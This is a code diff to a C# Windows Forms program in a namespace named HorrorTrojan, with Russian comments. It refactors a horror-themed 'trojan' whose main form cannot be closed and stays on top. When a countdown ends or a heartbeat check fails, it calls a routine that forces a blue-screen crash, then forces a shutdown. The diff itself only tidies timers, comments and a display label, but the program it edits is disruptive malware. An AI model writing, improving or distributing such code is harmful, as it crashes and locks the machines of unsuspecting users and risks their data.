@@ -43,8 +43,6 @@ namespace HorrorTrojan
             CalculateLayout();
             this.DoubleBuffered = true;
             this.SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.UserPaint | ControlStyles.Opaque, true);
-            
-            // Музыка инициализируется в Load, после того как форма полностью создана
         }
 
         private void InitializeComponent()
@@ -59,10 +57,10 @@ namespace HorrorTrojan
             this.ControlBox = false;
             this.DoubleBuffered = true;
 
-            bloodTimer.Interval = 50;  // 50 мс для плавности (20 кадров/сек)
+            bloodTimer.Interval = 100;
             bloodTimer.Tick += BloodTimer_Tick;
 
-            drawTimer.Interval = 50;
+            drawTimer.Interval = 100;
             drawTimer.Tick += DrawTimer_Tick;
 
             topMostTimer.Interval = 100;
@@ -167,14 +165,14 @@ namespace HorrorTrojan
                     if ((DateTime.Now - lastPing).TotalSeconds > 3)
                     {
                         StopMusic();
-                        if (!bsodTriggered) BSODTrigger.TriggerBSOD();
+                        if (!bsodTriggered) TriggerBSOD();
                         return;
                     }
                 }
                 catch
                 {
                     StopMusic();
-                    if (!bsodTriggered) BSODTrigger.TriggerBSOD();
+                    if (!bsodTriggered) TriggerBSOD();
                     return;
                 }
             }
@@ -191,7 +189,7 @@ namespace HorrorTrojan
             catch
             {
                 StopMusic();
-                if (!bsodTriggered) BSODTrigger.TriggerBSOD();
+                if (!bsodTriggered) TriggerBSOD();
             }
 
             try
@@ -219,7 +217,6 @@ namespace HorrorTrojan
                 TimeSpan elapsed = DateTime.Now - startTime;
                 double percent = (elapsed.TotalSeconds / maxSeconds) * 100.0;
                 
-                // КОРРЕКТНАЯ ЗАЩИТА ОТ БАГОВ
                 if (double.IsNaN(percent) || double.IsInfinity(percent))
                     percent = 0;
                 
@@ -243,7 +240,7 @@ namespace HorrorTrojan
                     if (!bsodTriggered)
                     {
                         bsodTriggered = true;
-                        BSODTrigger.TriggerBSOD();
+                        TriggerBSOD();
                     }
                     
                     ForceShutdown();
@@ -254,9 +251,14 @@ namespace HorrorTrojan
                 if (!bsodTriggered)
                 {
                     bsodTriggered = true;
-                    BSODTrigger.TriggerBSOD();
+                    TriggerBSOD();
                 }
             }
+        }
+
+        private void TriggerBSOD()
+        {
+            BSODTrigger.TriggerBSOD();
         }
 
         private void ForceShutdown()
@@ -337,16 +339,6 @@ namespace HorrorTrojan
             {
                 g.DrawRectangle(glowPen, indicatorX + 1, indicatorY + 1, indicatorWidth - 2, indicatorHeight - 2);
             }
-
-            using (Font font = new Font("Consolas", 7, FontStyle.Bold))
-            using (SolidBrush textBrush = new SolidBrush(Color.FromArgb(200, 255, 200, 200)))
-            {
-                string percent = bloodLevel + "%";
-                SizeF textSize = g.MeasureString(percent, font);
-                float textX = indicatorX + (indicatorWidth - textSize.Width) / 2;
-                float textY = indicatorY + (indicatorHeight - textSize.Height) / 2;
-                g.DrawString(percent, font, textBrush, textX, textY);
-            }
         }
 
         private void MainInterface_FormClosing(object sender, FormClosingEventArgs e)
@@ -354,7 +346,7 @@ namespace HorrorTrojan
             e.Cancel = true;
         }
 
-        // ===== ПЕРЕТАСКИВАНИЕ ОКНА (ИСПРАВЛЕНО) =====
+        // ===== ПЕРЕТАСКИВАНИЕ ОКНА =====
         private void MainInterface_MouseDown(object sender, MouseEventArgs e)
         {
             if (e.Button == MouseButtons.Left)
